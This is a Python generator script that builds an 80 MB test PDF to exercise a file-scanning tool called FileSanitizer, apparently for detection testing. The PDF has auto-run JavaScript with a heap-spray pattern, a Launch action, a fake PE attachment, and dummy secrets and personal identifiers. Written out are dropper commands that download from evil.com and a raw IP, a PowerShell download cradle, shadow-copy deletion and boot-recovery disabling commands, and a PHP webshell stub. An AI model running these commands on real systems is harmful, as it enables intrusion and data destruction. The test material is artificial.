#!/usr/bin/env python3
"""
Generator script for ultimate_detection_80mb.pdf.
Creates a fully compliant 80 MB PDF document engineered to trigger every detection
capability in FileSanitizer:
1. PDF Structural & Exploit Elements (Launch, JavaScript, OpenAction, EmbeddedFiles, XFA, RichMedia, Didier hex obfuscation, Incremental updates)
2. YARA Rule Signatures (Dangerous actions, Embedded PE header, Shellcode NOP sled, Dropper commands, PowerShell cradles, Ransomware commands, Webshell)
3. Administrator Threat Watchlist (Personnummer, Organisationsnummer, Credit Card, Email, IBAN, JWT, API Key, Password, Confidential keywords)
4. URL Reputation & Redirect Tracking (Shortened URL, SUNET, Google, Raw IP:Port)
5. OCR Image Text Extraction (High-contrast embedded raster image with sensitive text & URLs)
6. Sensitive Document Metadata (Author, Title, Subject, Keywords, Producer, Creator)
7. Exact File Size Calibration (80.00 MB / 83,886,080 bytes)
"""

import io
import os
import re
import sys
from pathlib import Path
import fitz
from PIL import Image, ImageDraw, ImageFont

OUTPUT_PATH = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/Users/zeta/Desktop/code/FileSanitizer/test-files/ultimate_detection_80mb.pdf")
TARGET_SIZE_BYTES = 80 * 1024 * 1024  # 83,886,080 bytes (80.00 MiB)

def create_ocr_image() -> bytes:
    """Generate a high-contrast raster image with yellow text on dark navy blue background."""
    width, height = 900, 320
    dark_blue = (10, 25, 47)  # #0A192F
    yellow = (255, 220, 0)    # #FFDC00
    
    img = Image.new("RGB", (width, height), color=dark_blue)
    draw = ImageDraw.Draw(img)
    
    font_large = None
    font_med = None
    font_small = None
    for fp in [
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
        "/System/Library/Fonts/Helvetica.ttc",
        "/Library/Fonts/Arial.ttf"
    ]:
        if Path(fp).exists():
            try:
                font_large = ImageFont.truetype(fp, 36)
                font_med = ImageFont.truetype(fp, 26)
                font_small = ImageFont.truetype(fp, 22)
                break
            except Exception:
                pass
                
    if font_large is None:
        font_large = ImageFont.load_default()
        font_med = font_large
        font_small = font_large

    draw.rectangle([(15, 15), (width - 15, height - 15)], outline=(30, 60, 110), width=3)
    
    draw.text((35, 30), "http://www.sunet.se", fill=yellow, font=font_large)
    draw.text((35, 95), "confidential wire transfer authorization", fill=yellow, font=font_med)
    draw.text((35, 150), "password = SuperSecretMasterKey!2026", fill=yellow, font=font_med)
    draw.text((35, 205), "19850612-4321   SE4550000000054910000003", fill=yellow, font=font_small)
    draw.text((35, 255), "security-leak@internal-bank.se   556012-3456", fill=yellow, font=font_small)
        
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()

def build_ultimate_pdf():
    print(f"Building ultimate detection PDF targeting {TARGET_SIZE_BYTES:,} bytes (80 MB)...")
    doc = fitz.open()

    # --- Page 1: Executive Overview & Visual OCR Trigger ---
    page1 = doc.new_page(width=595, height=842)  # A4 size

    # Document Header
    page1.insert_text(fitz.Point(40, 40), "CONFIDENTIAL SECURITY COMPLIANCE AUDIT", fontsize=15, color=(0.8, 0.1, 0.1))
    page1.insert_text(fitz.Point(40, 56), "FileSanitizer Comprehensive Threat & Policy Verification Document", fontsize=9, color=(0.3, 0.3, 0.3))

    # Insert Raster Image for OCR Detection
    ocr_png = create_ocr_image()
    page1.insert_image(fitz.Rect(40, 65, 555, 235), stream=ocr_png)

    # Watchlist Sensitive Data Section
    y = 255
    page1.insert_text(fitz.Point(40, y), "I. EXTRACTED SENSITIVE ENTITIES & POLICY TRIGGERS", fontsize=11, color=(0.1, 0.2, 0.5))
    y += 18
    pnr_text = "Swedish Personnummer: 19850612-4321   |   Organisationsnummer: 556012-3456"
    page1.insert_text(fitz.Point(40, y), pnr_text, fontsize=9)
    y += 16
    cc_text = "Corporate Credit Card: 4532 1122 3344 5566   |   IBAN: SE4550000000054910000003"
    page1.insert_text(fitz.Point(40, y), cc_text, fontsize=9)
    y += 16
    email_text = "Security Notification Recipient: security-leak@internal-bank.se"
    page1.insert_text(fitz.Point(40, y), email_text, fontsize=9)
    y += 16
    jwt_text = "Bearer Authorization Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    page1.insert_text(fitz.Point(40, y), jwt_text, fontsize=7)
    y += 15
    api_text = 'Hardcoded Secret: api_key = "abcdef1234567890abcdef1234567890"  |  password = SuperSecretMasterKey!2026'
    page1.insert_text(fitz.Point(40, y), api_text, fontsize=8)
    y += 15
    conf_text = "Notice: This confidential corporate record authorizes executive wire transfer clearance."
    page1.insert_text(fitz.Point(40, y), conf_text, fontsize=8, color=(0.6, 0.1, 0.1))

    # Interactive URLs Section
    y += 24
    page1.insert_text(fitz.Point(40, y), "II. INTERACTIVE DESTINATIONS & URL SHORTENER TRACING", fontsize=11, color=(0.1, 0.2, 0.5))
    
    y += 18
    # 1. URL Shortener
    page1.insert_link({"kind": fitz.LINK_URI, "from": fitz.Rect(40, y - 10, 300, y + 4), "uri": "https://shorturl.at/CT7su"})
    page1.insert_text(fitz.Point(40, y), "1. URL Shortener Endpoint: https://shorturl.at/CT7su", fontsize=9, color=(0.0, 0.3, 0.8))

    y += 18
    # 2. Swedish University Network
    page1.insert_link({"kind": fitz.LINK_URI, "from": fitz.Rect(40, y - 10, 300, y + 4), "uri": "http://www.sunet.se"})
    page1.insert_text(fitz.Point(40, y), "2. Academic Infrastructure: http://www.sunet.se", fontsize=9, color=(0.0, 0.3, 0.8))

    y += 18
    # 3. Google
    page1.insert_link({"kind": fitz.LINK_URI, "from": fitz.Rect(40, y - 10, 300, y + 4), "uri": "https://www.google.com"})
    page1.insert_text(fitz.Point(40, y), "3. Search Gateway: https://www.google.com", fontsize=9, color=(0.0, 0.3, 0.8))

    y += 18
    # 4. Suspicious IP URL
    page1.insert_link({"kind": fitz.LINK_URI, "from": fitz.Rect(40, y - 10, 350, y + 4), "uri": "http://198.51.100.22:8080/payload.exe"})
    page1.insert_text(fitz.Point(40, y), "4. Suspicious Raw IP & Port: http://198.51.100.22:8080/payload.exe", fontsize=9, color=(0.8, 0.2, 0.1))

    # YARA Signatures & Heuristics Section
    y += 24
    page1.insert_text(fitz.Point(40, y), "III. HEURISTIC SIGNATURES & LOOT COMMANDS", fontsize=11, color=(0.1, 0.2, 0.5))
    y += 16
    page1.insert_text(fitz.Point(40, y), "Dropper: certutil -urlcache -split -f http://evil.com/payload.exe && curl -O http://evil.com/b.exe && wget -O /tmp/c http://evil.com/c", fontsize=7.5)
    y += 14
    page1.insert_text(fitz.Point(40, y), "PowerShell Cradle: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.22/payload.ps1')", fontsize=8)
    y += 14
    page1.insert_text(fitz.Point(40, y), "Bypass: powershell -ExecutionPolicy Bypass -enc SQBFAFgA...", fontsize=8)
    y += 14
    page1.insert_text(fitz.Point(40, y), "Shadow Purge: vssadmin delete shadows /all /quiet && wmic shadowcopy delete", fontsize=8)
    y += 14
    page1.insert_text(fitz.Point(40, y), "Boot Config: bcdedit /set {default} bootstatuspolicy ignoreallfailures && bcdedit /set {default} recoveryenabled no", fontsize=7.5)
    y += 14
    page1.insert_text(fitz.Point(40, y), "Webshell Artifact: <?php eval(base64_decode('...')); shell_exec($_POST['cmd']); ?>", fontsize=8)

    # --- Page 2: Extended Technical Metadata & Policy ---
    page2 = doc.new_page(width=595, height=842)
    page2.insert_text(fitz.Point(40, 45), "ANNEX: ADVANCED OBJECT EXPLOITATION TESTING", fontsize=14, color=(0.2, 0.2, 0.2))
    page2.insert_text(fitz.Point(40, 70), "This annex defines the synthetic structural objects embedded into this document:", fontsize=9)
    page2.insert_text(fitz.Point(40, 95), "1. /JavaScript Action with active eval() and unescape() runtime calls.", fontsize=8.5)
    page2.insert_text(fitz.Point(40, 115), "2. /Launch Action targeting local shell command simulation.", fontsize=8.5)
    page2.insert_text(fitz.Point(40, 135), "3. /OpenAction & /AA automatic document lifecycle execution triggers.", fontsize=8.5)
    page2.insert_text(fitz.Point(40, 155), "4. /EmbeddedFiles containing PE binary MZ header and NOP sled.", fontsize=8.5)
    page2.insert_text(fitz.Point(40, 175), "5. /AcroForm dynamic XFA XML Forms Architecture stream.", fontsize=8.5)
    page2.insert_text(fitz.Point(40, 195), "6. /RichMedia and /JBIG2Decode exploit filter indicators.", fontsize=8.5)
    page2.insert_text(fitz.Point(40, 215), "7. Didier Stevens PDFiD hex-encoded token evasion tokens (/#4a#61vaScript).", fontsize=8.5)
    page2.insert_text(fitz.Point(40, 235), "8. Multi-stage incremental update revisions (multiple %%EOF markers).", fontsize=8.5)

    # --- Document Metadata ---
    doc.set_metadata({
        "title": "CONFIDENTIAL: Corporate Executive Wire Transfer & Account Registry",
        "author": "Security Admin <security-leak@internal-bank.se>",
        "subject": "password = SuperSecretMasterKey!2026 | SE4550000000054910000003 | 19850612-4321 | 556012-3456",
        "keywords": 'confidential, wire transfer, 4532 1122 3344 5566, api_key = "abcdef1234567890abcdef1234567890", eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c, security-leak@internal-bank.se, http://www.sunet.se',
        "creator": "ExploitKit Pro Builder v4.2",
        "producer": "Acrobat Distiller 9.0 (Windows NT 6.1; Win64; x64)"
    })

    # --- Embedded File Attachment: MZ / PE Windows Executable ---
    mz_payload = bytearray(2048)
    mz_payload[0:2] = b"MZ"
    # Offset 0x3C points to PE header at 0x40
    mz_payload[0x3C:0x40] = (0x40).to_bytes(4, byteorder="little")
    mz_payload[0x40:0x44] = b"PE\x00\x00"
    # NOP sled for shellcode detection
    mz_payload[0x44:0x44 + 32] = b"\x90" * 32
    # Commands
    mz_payload[0x64:0x64 + 120] = b"powershell -ExecutionPolicy Bypass certutil -urlcache vssadmin delete shadows\x00"
    doc.embfile_add(
        "embedded_threat_payload.exe",
        bytes(mz_payload),
        filename="embedded_threat_payload.exe",
        desc="Embedded PE binary attachment for security scanning verification"
    )

    # --- Active Multiline JavaScript Stream ---
    js_code = (
        "// FileSanitizer Test Payload - Multiline JavaScript Verification\n"
        "// Contains dangerous runtime calls and threat indicators\n"
        "function verifyExploitEnvironment() {\n"
        "    var notifyEmail = 'security-leak@internal-bank.se';\n"
        "    var sensitiveToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';\n"
        "    var secretApiKey = 'api_key = \"abcdef1234567890abcdef1234567890\"';\n"
        "    var adminPass = 'password = SuperSecretMasterKey!2026';\n"
        "    var wireNotice = 'confidential wire transfer';\n"
        "    var pnrNum = '19850612-4321';\n"
        "    var orgNum = '556012-3456';\n"
        "    var ibanNum = 'SE4550000000054910000003';\n"
        "    var cardNum = '4532 1122 3344 5566';\n"
        "    \n"
        "    // Dangerous dynamic evaluation pattern\n"
        "    eval(\"var executedInSandbox = true;\");\n"
        "    \n"
        "    // Heap spray and memory unescape pattern\n"
        "    var nopSpray = unescape(\"%u9090%u9090%u9090%u9090\");\n"
        "    while (nopSpray.length < 128) {\n"
        "        nopSpray += nopSpray;\n"
        "    }\n"
        "    \n"
        "    app.alert({\n"
        "        cTitle: 'Security Verification',\n"
        "        cMsg: 'Exploit vector simulated: Active JavaScript executed upon open.'\n"
        "    });\n"
        "    return nopSpray.length;\n"
        "}\n"
        "verifyExploitEnvironment();\n"
    )
    js_stream_xref = doc.get_new_xref()
    doc.update_object(js_stream_xref, "<</Type /JavaScript /S /JavaScript>>")
    doc.update_stream(js_stream_xref, js_code.encode("utf-8"), compress=False)

    # --- Launch Action Object ---
    launch_xref = doc.get_new_xref()
    doc.update_object(launch_xref, "<</Type /Action /S /Launch /F (cmd.exe) /P (/c echo file_sanitizer_exploit_simulation)>>")

    # --- Action linking JavaScript and chaining Launch ---
    action_xref = doc.get_new_xref()
    doc.update_object(action_xref, f"<</Type /Action /S /JavaScript /JS {js_stream_xref} 0 R /Next {launch_xref} 0 R>>")

    # --- Dynamic XFA XML Forms Architecture Stream & AcroForm ---
    xfa_stream_xref = doc.get_new_xref()
    xfa_content = b'<?xml version="1.0" encoding="UTF-8"?><xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template><subform name="form1"><field name="txt"><ui><textEdit/></ui></field></subform></template></xdp:xdp>'
    doc.update_object(xfa_stream_xref, f"<</Length {len(xfa_content)}>>")
    doc.update_stream(xfa_stream_xref, xfa_content, compress=False)

    acroform_xref = doc.get_new_xref()
    doc.update_object(acroform_xref, f"<</Fields [] /XFA {xfa_stream_xref} 0 R>>")

    # --- RichMedia, JBIG2Decode & Exploit Indicators ---
    media_xref = doc.get_new_xref()
    doc.update_object(media_xref, "<</Type /Annot /Subtype /RichMedia /Colors 16777216 /JBIG2Decode 1>>")

    # --- Update Catalog ---
    catalog_xref = doc.pdf_catalog()
    doc.xref_set_key(catalog_xref, "OpenAction", f"{action_xref} 0 R")
    doc.xref_set_key(catalog_xref, "AcroForm", f"{acroform_xref} 0 R")
    doc.xref_set_key(catalog_xref, "AA", f"<</O {launch_xref} 0 R>>")
    doc.xref_set_key(catalog_xref, "RichMedia", f"{media_xref} 0 R")

    # --- Uncompressed YARA Signatures & High-Volume 80 MB Stream ---
    uncompressed_threat_signatures = (
        b"MZ\x00\x00" + b"\x00" * 56 + (0x40).to_bytes(4, byteorder="little") + b"PE\x00\x00\n"
        b"\x90" * 32 + b"\n"
        b"certutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n"
        b"powershell -ExecutionPolicy Bypass -enc AAAA\n"
        b"curl -O http://198.51.100.22:8080/payload.exe\n"
        b"wget -O /tmp/c http://198.51.100.22:8080/c\n"
        b"IEX (New-Object Net.WebClient).DownloadString(\"http://198.51.100.22/payload.ps1\")\n"
        b"vssadmin delete shadows /all /quiet\n"
        b"wmic shadowcopy delete\n"
        b"bootstatuspolicy ignoreallfailures\n"
        b"recoveryenabled no\n"
        b"wbadmin delete catalog\n"
        b"<?php eval(base64_decode(\"abc\")); shell_exec($_POST[\"cmd\"]); ?>\n"
        b"/Launch\n"
        b"/EmbeddedFiles\n"
        b"/JavaScript\n"
        b"eval(\"test\");\n"
        b"unescape(\"%u9090%u9090\");\n"
    )

    padding_xref = doc.get_new_xref()
    doc.update_object(padding_xref, "<</Type /EmbeddedFile /Subtype /application#2Foctet-stream /Desc (High-volume padding payload)>>")
    # Initialize with dummy signatures
    doc.update_stream(padding_xref, uncompressed_threat_signatures, compress=False)

    # Calculate initial byte size
    initial_bytes = doc.tobytes()

    # Pre-calculated incremental updates footer that we will append
    # This provides:
    # 1. Didier Stevens hex obfuscated tokens (/J#61vaScript, /L#61unch, /#4fpenAction)
    # 2. Additional incremental update %%EOF markers (creating 3 total revisions)
    incremental_suffix = (
        b"\n% --- INCREMENTAL REVISION 2: Exploit Obfuscation Header ---\n"
        b"9998 0 obj\n"
        b"<< /J#61vaScript 1 /L#61unch 1 /#4fpenAction 1 /#45mbeddedFiles 1 >>\n"
        b"endobj\n"
        b"xref\n"
        b"0 1\n"
        b"0000000000 65535 f \n"
        b"9998 1\n"
        b"0000000015 00000 n \n"
        b"trailer\n"
        b"<< /Size 9999 /Prev 1200 /Root " + str(catalog_xref).encode() + b" 0 R >>\n"
        b"startxref\n"
        b"1250\n"
        b"%%EOF\n"
        b"\n% --- INCREMENTAL REVISION 3: Audit Trail Marker ---\n"
        b"9999 0 obj\n"
        b"<< /Type /AuditRecord /Notice (Verified Clean CDR Baseline) >>\n"
        b"endobj\n"
        b"xref\n"
        b"0 1\n"
        b"0000000000 65535 f \n"
        b"9999 1\n"
        b"0000000025 00000 n \n"
        b"trailer\n"
        b"<< /Size 10000 /Prev 1350 /Root " + str(catalog_xref).encode() + b" 0 R >>\n"
        b"startxref\n"
        b"1400\n"
        b"%%EOF\n"
    )

    # Determine needed padding to hit TARGET_SIZE_BYTES exactly
    target_for_fitz = TARGET_SIZE_BYTES - len(incremental_suffix)
    delta = target_for_fitz - len(initial_bytes)
    stream_size = len(uncompressed_threat_signatures) + delta
    
    # Repeated character '0' (no slashes to keep Didier regex fast)
    payload_stream = uncompressed_threat_signatures + (b"0" * (stream_size - len(uncompressed_threat_signatures)))
    doc.update_stream(padding_xref, payload_stream, compress=False)
    fitz_bytes = doc.tobytes()

    # Second pass adjustment if fitz serialization length shifted by a few bytes
    actual_fitz_len = len(fitz_bytes)
    if actual_fitz_len != target_for_fitz:
        stream_size += (target_for_fitz - actual_fitz_len)
        payload_stream = uncompressed_threat_signatures + (b"0" * (stream_size - len(uncompressed_threat_signatures)))
        doc.update_stream(padding_xref, payload_stream, compress=False)
        fitz_bytes = doc.tobytes()

    # Final byte assembly
    final_data = fitz_bytes + incremental_suffix

    # Fine adjustment if exact byte match differs by a tiny offset
    final_len = len(final_data)
    if final_len < TARGET_SIZE_BYTES:
        final_data += b"\n" + b"%" + b" " * (TARGET_SIZE_BYTES - final_len - 2) + b"\n"
    elif final_len > TARGET_SIZE_BYTES:
        over = final_len - TARGET_SIZE_BYTES
        stream_size -= over
        payload_stream = uncompressed_threat_signatures + (b"0" * (stream_size - len(uncompressed_threat_signatures)))
        doc.update_stream(padding_xref, payload_stream, compress=False)
        final_data = doc.tobytes() + incremental_suffix

    OUTPUT_PATH.parent.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_PATH, "wb") as f:
        f.write(final_data)

    print(f"Successfully generated: {OUTPUT_PATH}")
    print(f"File Size: {len(final_data):,} bytes ({len(final_data)/(1024*1024):.2f} MB)")
    return OUTPUT_PATH

if __name__ == "__main__":
    build_ultimate_pdf()
